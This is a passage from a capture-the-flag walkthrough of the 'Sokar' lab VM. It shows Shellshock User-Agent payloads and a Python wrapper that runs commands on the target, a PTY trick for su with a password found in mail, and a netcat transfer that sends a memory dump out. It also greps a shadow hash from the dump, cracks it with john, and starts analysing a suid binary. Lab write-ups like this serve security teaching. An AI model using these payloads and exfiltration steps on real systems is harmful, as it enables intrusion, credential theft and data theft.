&lt;p&gt;Not having an interactive shell was not the end of the world. Instead of fussing about that I decided to move on to poking around some more. Enumeration revealed that &lt;code&gt;/home/bynarr&lt;/code&gt; was readable to me. In there was what looked like a kernel module &lt;code&gt;lime.ko&lt;/code&gt; and a script called &lt;code&gt;lime&lt;/code&gt; to &lt;code&gt;insmod&lt;/code&gt; it. Both were owned by root:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python shock.py &amp;quot;/bin/cat /home/bynarr/lime&amp;quot;
 * Executing /bin/cat /home/bynarr/lime

#!/bin/bash
echo &amp;quot;&amp;quot;&amp;quot;
==========================
Linux Memory Extractorator
==========================
&amp;quot;
echo &amp;quot;LKM, add or remove?&amp;quot;
echo -en &amp;quot;&amp;gt; &amp;quot;

read -e input

if [ $input == &amp;quot;add&amp;quot; ]; then

    /sbin/insmod /home/bynarr/lime.ko &amp;quot;path=/tmp/ram format=raw&amp;quot;

elif [ $input == &amp;quot;remove&amp;quot; ]; then

    /sbin/rmmod lime

else

    echo &amp;quot;Invalid input, burn in the fires of Netu!&amp;quot;

fi

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I knew that the chances were slim that it would allow me to run &lt;code&gt;insmod&lt;/code&gt; as &lt;code&gt;apache&lt;/code&gt;, but ofc I tried running the script regardless. Due to the fact that the file called &lt;code&gt;/tmp/ram&lt;/code&gt; was not created after running &lt;code&gt;python shock.py &amp;quot;echo \&amp;quot;add\&amp;quot; | /home/bynarr/lime&amp;quot;&lt;/code&gt;, I assumed it failed.&lt;/p&gt;

&lt;p&gt;Later, some more enumeration finally got me to &lt;code&gt;/var/spool/mail/bynarr&lt;/code&gt; with a message with the following contents:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;leonjza@kali/sokar $ python shock.py &amp;quot;/bin/cat /var/spool/mail/bynarr&amp;quot;
 * Executing /bin/cat /var/spool/mail/bynarr

Return-Path: &amp;lt;root@sokar&amp;gt;
Delivered-To: bynarr@localhost
Received:  from root by localhost
To: &amp;lt;bynarr@sokar&amp;gt;
Date: Thu, 13 Nov 2014 22:04:31 +0100
Subject: Welcome

Dear Bynarr.  Welcome to Sokar Inc. Forensic Development Team.
A user account has been setup for you.

UID 500 (bynarr)
GID 500 (bynarr)
    501 (forensic)

Password &#39;fruity&#39;.  Please change this ASAP.
Should you require, you&#39;ve been granted outbound ephemeral port access on 51242, to transfer non-sensitive forensic dumps out for analysis.

All the best in your new role!

  -Sokar-
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I confirmed that &lt;code&gt;bynarr&lt;/code&gt; was in the groups mentioned in the mail:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python shock.py &amp;quot;/usr/bin/id bynarr&amp;quot;
 * Executing /usr/bin/id bynarr

uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What confused me here was the mention of &lt;em&gt;&amp;ldquo;outbound ephemeral port access on 51242&amp;rdquo;&lt;/em&gt;. I reduced my port scanners range to only scan from 51240 to 51250 to confirm this. I transferred the updated port scanner to Sokar, opened up a new &lt;code&gt;tcpdump&lt;/code&gt; session and waited anxiously. &lt;code&gt;tcp/51242&lt;/code&gt; outbound still appeared to be closed.&lt;/p&gt;

&lt;p&gt;Of course, the most valuable piece of information was definitely the password &lt;em&gt;fruity&lt;/em&gt;. Now, remember, I have a limited shell. Not a interactive one. I have been interfacing with Sokar only via python scripts which are executing commands via Shellshock HTTP requests.&lt;/p&gt;

&lt;p&gt;Essentially, the easiest way for me to become &lt;code&gt;bynarr&lt;/code&gt; (assuming &lt;em&gt;fruity&lt;/em&gt; really is the password), would be to &lt;code&gt;su&lt;/code&gt; right? Sounds like a 2 sec job. Well, it wasn’t :( Instead, I got caught up in a whole bunch of interesting situations where &lt;code&gt;su&lt;/code&gt; expects a password via &lt;code&gt;stdin&lt;/code&gt;, requires a valid tty (which I don’t have) and will spawn a shell for me to interact with (which I can&amp;rsquo;t). Quite some time later, I got closer to becoming &lt;code&gt;bynarr&lt;/code&gt; with something like &lt;code&gt;echo fruity | su bynarr&lt;/code&gt;. To add to the pain, my shellshock shell also did not have a proper environment, so I had to prefix most commands with their full paths. Luckily though &lt;code&gt;$(which id)&lt;/code&gt; came in very handy and saved some time. In retrospect, I could have probably just exported &lt;code&gt;PATH&lt;/code&gt; as required, but heh.&lt;/p&gt;

&lt;p&gt;Fast forward some time, I came across &lt;a href=&#34;http://pen-testing.sans.org/blog/2014/07/08/sneaky-stealthy-su-in-web-shells&#34;&gt;this&lt;/a&gt; SANS blogpost, which details on the topic of some &amp;lsquo;stealthy&amp;rsquo; su shells. Most importantly, the example of &lt;code&gt;(sleep 1; echo password) | python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;whoami&#39;]);&amp;quot;&lt;/code&gt; got me the closest to &lt;code&gt;bynarr&lt;/code&gt;. Toying around with this a little, I realized that for some reason, the &lt;code&gt;(&lt;/code&gt; and &lt;code&gt;)&lt;/code&gt; characters were messing around, so I replaced that section with some python too. After a whole bunch attempts, I eventually got this to work:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;/usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);&amp;quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;(Basically, spawn a tty; attempt to &lt;code&gt;su&lt;/code&gt; specifying the command to run with &lt;code&gt;-c&lt;/code&gt;, then 1 second later, echo &lt;code&gt;fruity&lt;/code&gt; to the &lt;em&gt;Password&lt;/em&gt; prompt and execute &lt;code&gt;id&lt;/code&gt; as &lt;code&gt;bynarr&lt;/code&gt;)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python shock.py &amp;quot;/usr/bin/python -c \&amp;quot;import time; time.sleep(1); print &#39;fruity&#39;\&amp;quot; | /usr/bin/python -c \&amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);\&amp;quot;&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);&amp;quot;

Password:
uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;:D As this is actually a Shellshock request, the full &lt;code&gt;User-Agent&lt;/code&gt; header therefore was:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;() { :;};echo;/usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Again, constructing that every time I want to execute something as &lt;code&gt;bynarr&lt;/code&gt; would have been le-suck, so I made another wrapper script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

# Sokar &#39;bynarr&#39; command execution
# 2015 Leon Jacobs

import requests
import sys

if len(sys.argv) &amp;lt; 2:

    print &amp;quot; * Usage %s &amp;lt;cmd&amp;gt;&amp;quot; % sys.argv[0]
    sys.exit(1)

command = sys.argv[1].strip()
payload = &amp;quot;&amp;quot;&amp;quot;/usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;%s&#39;, &#39;bynarr&#39;]);&amp;quot; &amp;quot;&amp;quot;&amp;quot; % command
print &amp;quot; * Executing %s\n&amp;quot; % payload

# prepare the sploit header
headers = { &amp;quot;User-Agent&amp;quot;: &amp;quot;() { :;};echo;%s&amp;quot; % payload }
print requests.get(&amp;quot;http://192.168.217.163:591/cgi-bin/cat&amp;quot;, headers=headers).text.strip()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;All I have to do to get the output of &lt;code&gt;id&lt;/code&gt; is provide it as a argument to &lt;code&gt;bynarr.py&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python bynarr.py &amp;quot;id&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;id&#39;, &#39;bynarr&#39;]);&amp;quot;

Password:
uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;the-scary-linux-memory-extractor&#34;&gt;the scary linux memory extractor&lt;/h2&gt;

&lt;p&gt;With command access as &lt;code&gt;bynarr&lt;/code&gt; and remembering the mention of &lt;code&gt;tcp/51242&lt;/code&gt; outbound connectivity, I once more try and run the port scanner that got copied to &lt;code&gt;/tmp&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python bynarr.py &amp;quot;/usr/bin/python /tmp/port_scan.py&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;/usr/bin/python /tmp/port_scan.py&#39;, &#39;bynarr&#39;]);&amp;quot;

Password:
Trying port 51240
Trying port 51241
Trying port 51242
Trying port 51243
Trying port 51244
Trying port 51245
Trying port 51246
Trying port 51247
Trying port 51248
Trying port 51249
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Checking the &lt;code&gt;tcpdump&lt;/code&gt; output of this run&amp;hellip;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;leonjza@kali/sokar $ tcpdump -i eth1 not arp and not port 591
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes
07:33:43.178113 IP 192.168.217.163.40371 &amp;gt; 192.168.217.174.51242: Flags [S], seq 594732851, win 14600, options [mss 1460,sackOK,TS val 2274844 ecr 0,nop,wscale 4], length 0
07:33:43.178129 IP 192.168.217.174.51242 &amp;gt; 192.168.217.163.40371: Flags [R.], seq 0, ack 594732852, win 0, length 0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; I finally see something coming out of Sokar!
So &lt;code&gt;bynarr&lt;/code&gt; is able to talk out on &lt;code&gt;tcp/51242&lt;/code&gt;. Wut. Taking a few moments to think about this, I remembered that &lt;code&gt;iptables&lt;/code&gt; is able to filter by user id using the &lt;code&gt;owner&lt;/code&gt; module. At this stage, this was the only thing that made sense why &lt;code&gt;apache&lt;/code&gt; would not be able to talk out on this port, but &lt;code&gt;bynarr&lt;/code&gt; can.&lt;/p&gt;

&lt;p&gt;So with that out the way, it was time to focus on this &lt;code&gt;lime&lt;/code&gt; thing. &lt;code&gt;bynarr&lt;/code&gt; was allowed to run &lt;code&gt;/home/bynarr/lime&lt;/code&gt; as root via &lt;code&gt;sudo&lt;/code&gt; without a password (as I suspected for the &lt;code&gt;insmod&lt;/code&gt;):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python bynarr.py &amp;quot;sudo -l&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;sudo -l&#39;, &#39;bynarr&#39;]);&amp;quot;

Password:
Matching Defaults entries for bynarr on this host:
    !requiretty, visiblepw, always_set_home, env_reset, env_keep=&amp;quot;COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&amp;quot;, env_keep+=&amp;quot;MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&amp;quot;, env_keep+=&amp;quot;LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&amp;quot;, env_keep+=&amp;quot;LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&amp;quot;, env_keep+=&amp;quot;LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&amp;quot;,
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User bynarr may run the following commands on this host:
    (ALL) NOPASSWD: /home/bynarr/lime
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I had no freaking idea what &lt;code&gt;lime&lt;/code&gt; even really is, so, to the Gooooogles I went and came across this: &lt;a href=&#34;https://github.com/504ensicsLabs/LiME&#34;&gt;https://github.com/504ensicsLabs/LiME&lt;/a&gt;. A forensics tool thingy thing. It seems like I will get to crawl through a dump of the current memory. Cool ;p&lt;/p&gt;

&lt;p&gt;I ran the script to &lt;code&gt;insmod&lt;/code&gt; the &lt;code&gt;lime.ko&lt;/code&gt;, this time with &lt;code&gt;sudo&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python bynarr.py &amp;quot;echo \&amp;quot;add\&amp;quot; | sudo /home/bynarr/lime&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(1); print &#39;fruity&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;echo &amp;quot;add&amp;quot; | sudo /home/bynarr/lime&#39;, &#39;bynarr&#39;]);&amp;quot;

Password:

==========================
Linux Memory Extractorator
==========================

LKM, add or remove?
&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I checked &lt;code&gt;/tmp&lt;/code&gt; for the existence of the &lt;code&gt;ram&lt;/code&gt; file and it was present. Looks like it worked :D. A quick note here. When I imported the VM initially, I upped the memory to 2GB. It was set to only have 256Mb by default which I thought was a little low. Sokar has limited disk space, so I was not getting the full memory dump. When I eventually noticed this, I reduced it back to the initial 256Mb and worked from there.&lt;/p&gt;

&lt;p&gt;Remembering the outbound port access, I opened a netcat listener on my local Kali linux to redirect a incoming file to a local &lt;code&gt;ram&lt;/code&gt; file with &lt;code&gt;nc -lvp 51242 &amp;gt; ram&lt;/code&gt;. Then, using my wrapper script &lt;code&gt;bynarr.py&lt;/code&gt; again, I redirected the &lt;code&gt;/tmp/ram&lt;/code&gt; file out over the netcat connection with: &lt;code&gt;python bynarr.py &amp;quot;/usr/bin/nc 192.168.217.174 51242 &amp;lt; /tmp/ram&amp;quot;&lt;/code&gt;. I now had a memory dump of Sokar on my local Kali Linux.&lt;/p&gt;

&lt;p&gt;It was at this stage that I went down the wrong rabbit hole. &lt;a href=&#34;https://code.google.com/p/volatility/&#34;&gt;Volatility&lt;/a&gt; was the first thing that came to mind when I saw this speak of memory dumps and what not. Having always just had this on my todo list, I figured that this was the perfect opportunity to finally give it a spin. I followed most of the docs to try and match the exact same kernel version as Sokar had (I have a number of CentOS VM&amp;rsquo;s) and prepared a profile as required. Short version, it failed. I was not able to get Volatility to give me anything useful. Eventually I reconsidered my approach and went back to trusty &amp;lsquo;ol &lt;code&gt;strings&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;I had to think a bit about what could possibly be useful in memory for me now. I noticed the user &lt;code&gt;apophis&lt;/code&gt; had a home directory that I have not yet been able to access, so I promptly grepped the ram image for this user:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ strings ram | grep apophis

[... snip ...]

apophis:[snip]0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7:::
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&amp;hellip; &lt;strong&gt;wut&lt;/strong&gt;. Why&amp;hellip; wait a sec. Why the heck is a password hash in memory now. Dont think there has been any activity for this user yet&amp;hellip; but clearly I don’t understand half of the technicalities here :( But hey. Lets run it through &lt;code&gt;john&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ john passwd --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type &amp;quot;sha512crypt&amp;quot;, but the string is also recognized as &amp;quot;crypt&amp;quot;
Use the &amp;quot;--format=crypt&amp;quot; option to force loading these as that type instead
Loaded 1 password hash (sha512crypt [32/32])
overdrive        (apophis)
guesses: 1  time: 0:00:01:51 DONE (Sat Jan 31 20:35:42 2015)  c/s: 327  trying: parati - nicole28
Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;apophis:overdrive&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;build-the-clone-to-the-hook&#34;&gt;build the clone to the hook&lt;/h2&gt;

&lt;p&gt;To get command execution as &lt;code&gt;apophis.py&lt;/code&gt; I copied the &lt;code&gt;bynarr.py&lt;/code&gt; script to make &lt;code&gt;apophis.py&lt;/code&gt;, changing the username and the password.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;id&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;id&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
uid=501(apophis) gid=502(apophis) groups=502(apophis)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There we go! Command execution as &lt;code&gt;apophis&lt;/code&gt; :) In &lt;code&gt;/home/apophis&lt;/code&gt; there was a suid (for &lt;code&gt;root&lt;/code&gt;) binary called &lt;code&gt;build&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;ls -lah /home/apophis&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;ls -lah /home/apophis&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
total 36K
drwx------  2 apophis apophis 4.0K Jan  2 20:12 .
drwxr-xr-x. 4 root    root    4.0K Dec 30 19:20 ..
-rw-------  1 apophis apophis    9 Feb  2 20:55 .bash_history
-rw-r--r--  1 apophis apophis   18 Feb 21  2013 .bash_logout
-rw-r--r--  1 apophis apophis  176 Feb 21  2013 .bash_profile
-rw-r--r--  1 apophis apophis  124 Feb 21  2013 .bashrc
-rwsr-sr-x  1 root    root    8.3K Jan  2 17:49 build
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I thought I would copy this &lt;code&gt;build&lt;/code&gt; binary off the box as I don’t exactly have a nice interactive shell to work with yet. &lt;code&gt;apophis&lt;/code&gt; was also not able to to connect via &lt;code&gt;tcp/51242&lt;/code&gt; outbound, which further confirmed my suspicions on the &lt;code&gt;user&lt;/code&gt; module being used in iptables. I copied the binary to &lt;code&gt;/tmp/build&lt;/code&gt; and pushed it out via netcat as &lt;code&gt;bynarr&lt;/code&gt; (using my helper script) towards my local Kali linux install. Finally I had &lt;code&gt;build&lt;/code&gt; locally to play with.&lt;/p&gt;

&lt;p&gt;I later noticed it was a 64bit binary, so I had to move it over to my 64bit install of Kali Linux to inspect further.
Running it asked you if you wanted to &amp;lsquo;build?&amp;rsquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ ./build
Build? (Y/N) Y
Cloning into &#39;/mnt/secret-project&#39;...
ssh: Could not resolve hostname sokar-dev:: Name or service not known
fatal: The remote end hung up unexpectedly
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That looks very much like the output of a git clone attempt. Knowing what the binary expects now, I continued to run this on Sokar via my Shellshock wrapper for &lt;code&gt;apophis&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ python apophis.py &amp;quot;echo Y | /home/apophis/build&amp;quot;
 * Executing /usr/bin/python -c &amp;quot;import time; time.sleep(2); print &#39;overdrive&#39;&amp;quot; | /usr/bin/python -c &amp;quot;import pty; pty.spawn([&#39;/bin/su&#39;, &#39;-l&#39;, &#39;-c&#39;,&#39;echo Y | /home/apophis/build&#39;, &#39;apophis&#39;]);&amp;quot;

Password:
Cloning into &#39;/mnt/secret-project&#39;...
ssh: Could not resolve hostname sokar-dev: Temporary failure in name resolution
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
Build? (Y/N)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The same hostname resolution failure occurred. Hmm. Thinking about this, it looks like it is trying to clone a repository (as root??) to &lt;code&gt;/mnt/secret-project&lt;/code&gt; from &lt;code&gt;sokar-dev&lt;/code&gt; which does not resolve.&lt;/p&gt;

&lt;h3 id=&#34;the-impossible-b0f&#34;&gt;the impossible b0f&lt;/h3&gt;

&lt;p&gt;I was very unsure about what the next move should be. Playing around some more with the binary, it appeared as though there may be a buffer overflow problem when providing a answer to &lt;code&gt;build.&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ ./build
Build? (Y/N) YY
*** buffer overflow detected ***: ./build terminated
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x37)[0x2b53e6df5fe7]
/lib/x86_64-linux-gnu/libc.so.6(+0xefea0)[0x2b53e6df4ea0]
/lib/x86_64-linux-gnu/libc.so.6(__gets_chk+0x195)[0x2b53e6df4df5]
./build(main+0xea)[0x2b53e68e29d9]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xfd)[0x2b53e6d23ead]
./build(+0x7d9)[0x2b53e68e27d9]
======= Memory map: ========
2b53e68e2000-2b53e68e3000 r-xp 00000000 fe:00 667555                     /root/sokar/build
2b53e68e3000-2b53e68e7000 rwxp 00000000 00:00 0
2b53e6900000-2b53e6902000 rwxp 00000000 00:00 0
2b53e6ae2000-2b53e6ae3000 rwxp 00000000 fe:00 667555                     /root/sokar/build
2b53e6ae3000-2b53e6b03000 r-xp 00000000 fe:00 532890                     /lib/x86_64-linux-gnu/ld-2.13.so
2b53e6d02000-2b53e6d03000 r-xp 0001f000 fe:00 532890                     /lib/x86_64-linux-gnu/ld-2.13.so
2b53e6d03000-2b53e6d04000 rwxp 00020000 fe:00 532890                     /lib/x86_64-linux-gnu/ld-2.13.so
2b53e6d04000-2b53e6d05000 rwxp 00000000 00:00 0
2b53e6d05000-2b53e6e87000 r-xp 00000000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e6e87000-2b53e7087000 ---p 00182000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e7087000-2b53e708b000 r-xp 00182000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e708b000-2b53e708c000 rwxp 00186000 fe:00 534538                     /lib/x86_64-linux-gnu/libc-2.13.so
2b53e708c000-2b53e7091000 rwxp 00000000 00:00 0
2b53e7091000-2b53e70a6000 r-xp 00000000 fe:00 523276                     /lib/x86_64-linux-gnu/libgcc_s.so.1
2b53e70a6000-2b53e72a6000 ---p 00015000 fe:00 523276                     /lib/x86_64-linux-gnu/libgcc_s.so.1
2b53e72a6000-2b53e72a7000 rwxp 00015000 fe:00 523276                     /lib/x86_64-linux-gnu/libgcc_s.so.1
2b53e886b000-2b53e888c000 rwxp 00000000 00:00 0                          [heap]
7fff340b7000-7fff340d8000 rwxp 00000000 00:00 0                          [stack]
7fff341eb000-7fff341ed000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
[1]    18571 abort      ./build
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I slapped &lt;code&gt;build&lt;/code&gt; into &lt;code&gt;gdb&lt;/code&gt; to take a closer look at the potential overflow as well as the security features that &lt;code&gt;build&lt;/code&gt; has been compiled with:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;leonjza@kali/sokar $ gdb -q ./build
Reading symbols from /root/sokar/build...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : disabled
PIE       : ENABLED
RELRO     : disabled
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;:O The &lt;code&gt;CANARY&lt;/code&gt; explains the failure in &lt;code&gt;__fortify_fail&lt;/code&gt;. Disassembly of the &lt;code&gt;main&lt;/code&gt; function reveals a call to &lt;code&gt;__gets_chk&lt;/code&gt; which is responsible for the canary validation:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ disass main
Dump of assembler code for function main:

 [... snip ...]

   0x00000000000009cc &amp;lt;+221&amp;gt;:   mov    esi,0x2
   0x00000000000009d1 &amp;lt;+226&amp;gt;:   mov    rdi,rbx
   0x00000000000009d4 &amp;lt;+229&amp;gt;:   call   0x760 &amp;lt;__gets_chk@plt&amp;gt;
   0x00000000000009d9 &amp;lt;+234&amp;gt;:   lea    rsi,[rbp-0x30]
   0x00000000000009dd &amp;lt;+238&amp;gt;:   mov    rdi,rbx
   0x00000000000009e0 &amp;lt;+241&amp;gt;:   call   0x790 &amp;lt;strcmp@plt&amp;gt;
   0x00000000000009e5 &amp;lt;+246&amp;gt;:   test   eax,eax

 [... snip ...]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;It is possible that the original source was using &lt;code&gt;gets()&lt;/code&gt; without a bounds check, but is compiled with SSP. This coupled with the fact that it is a 64bit binary and Sokar having ASLR enabled, made my head hurt. In fact, I was very demotivated at this stage as exploitation under these scenarios is very difficult.&lt;/p&gt;

&lt;p&gt;I fiddled around a little more with the binary, and inspected the call to &lt;code&gt;encryptDecrypt&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ disass encryptDecrypt
Dump of assembler code for function encryptDecrypt:
   0x00000000000008ac &amp;lt;+0&amp;gt;: mov    rdx,rdi
   0x00000000000008af &amp;lt;+3&amp;gt;: mov    r9d,0x0
   0x00000000000008b5 &amp;lt;+9&amp;gt;: mov    r11,0xffffffffffffffff
   0x00000000000008bc &amp;lt;+16&amp;gt;:    mov    r10,rdi
   0x00000000000008bf &amp;lt;+19&amp;gt;:    mov    eax,0x0
   0x00000000000008c4 &amp;lt;+24&amp;gt;:    jmp    0x8d6 &amp;lt;encryptDecrypt+42&amp;gt;
   0x00000000000008c6 &amp;lt;+26&amp;gt;:    movzx  ecx,BYTE PTR [rdx+r8*1]
   0x00000000000008cb &amp;lt;+31&amp;gt;:    xor    ecx,0x49
   0x00000000000008ce &amp;lt;+34&amp;gt;:    mov    BYTE PTR [rsi+r8*1],cl
   0x00000000000008d2 &amp;lt;+38&amp;gt;:    add    r9d,0x1
   0x00000000000008d6 &amp;lt;+42&amp;gt;:    movsxd r8,r9d
   0x00000000000008d9 &amp;lt;+45&amp;gt;:    mov    rcx,r11
   0x00000000000008dc &amp;lt;+48&amp;gt;:    mov    rdi,r10
   0x00000000000008df &amp;lt;+51&amp;gt;:    repnz scas al,BYTE PTR es:[rdi]
   0x00000000000008e1 &amp;lt;+53&amp;gt;:    not    rcx
   0x00000000000008e4 &amp;lt;+56&amp;gt;:    sub    rcx,0x1
   0x00000000000008e8 &amp;lt;+60&amp;gt;:    cmp    r8,rcx
   0x00000000000008eb &amp;lt;+63&amp;gt;:    jb     0x8c6 &amp;lt;encryptDecrypt+26&amp;gt;
   0x00000000000008ed &amp;lt;+65&amp;gt;:    repz ret
End of assembler dump.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This together with pseudo code generated by Hopper helped me understand the encryptDecrypt function running a xor with &lt;strong&gt;I&lt;/strong&gt; as the key over a string.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;void encryptDecrypt(int arg0, int arg1) {
    rsi = arg1;
    rdx = arg0;
    LODWORD(r9) = 0x0;
    r10 = arg0;
    do {
            r8 = sign_extend_64(LODWORD(r9));
            asm{ repne scasb  };
            if (r8 &amp;gt;= !0xffffffffffffffff - 0x1) {
                break;
            }
            *(int8_t *)(rsi + r8) = LOBYTE(LODWORD(*(int8_t *)(rdx + r8) &amp;amp; 0xff) ^ 0x49);
            LODWORD(r9) = LODWORD(r9) + 0x1;
    } while (true);
    return;
}
&lt;/code&gt;&lt;/pre&gt;

